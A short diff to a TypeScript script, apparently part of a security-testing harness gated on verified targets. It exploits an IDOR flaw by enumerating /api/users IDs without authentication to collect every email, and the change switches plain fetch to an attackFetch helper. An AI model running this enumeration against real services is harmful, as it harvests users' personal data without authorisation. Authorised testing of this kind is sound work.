@@ -1,5 +1,5 @@
 // IDOR: walk /api/users/1..N with no auth and collect every email.
-import { banner, requireVerifiedTarget } from "./_lib.ts";
+import { attackFetch, banner, requireVerifiedTarget } from "./_lib.ts";
 
 const origin = requireVerifiedTarget();
 banner("idor-enumerate", origin);
@@ -9,7 +9,7 @@ const emails: string[] = [];
 let blockedAt = 0;
 
 for (let id = 1; id <= N; id++) {
-  const res = await fetch(`${origin}/api/users/${id}`);
+  const res = await attackFetch(`${origin}/api/users/${id}`);
   if (res.status === 403 || res.status === 429) {
     blockedAt = id;
     break;
